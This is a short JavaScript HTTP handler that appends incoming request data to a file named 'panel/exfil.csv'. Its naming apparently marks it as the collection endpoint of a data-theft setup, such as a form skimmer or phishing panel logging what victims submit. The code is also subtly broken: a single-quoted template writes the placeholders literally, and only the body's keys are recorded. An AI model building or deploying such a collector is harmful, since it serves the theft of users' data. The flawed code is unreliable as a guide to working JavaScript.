import fs from 'fs';
export default (req,res)=>{
 const {id}=req.query;
 const body=Object.keys(req.body).join('&');
 fs.appendFileSync('panel/exfil.csv','${Date.now()},${id},${body}\n');
 res.status(204).end();
};
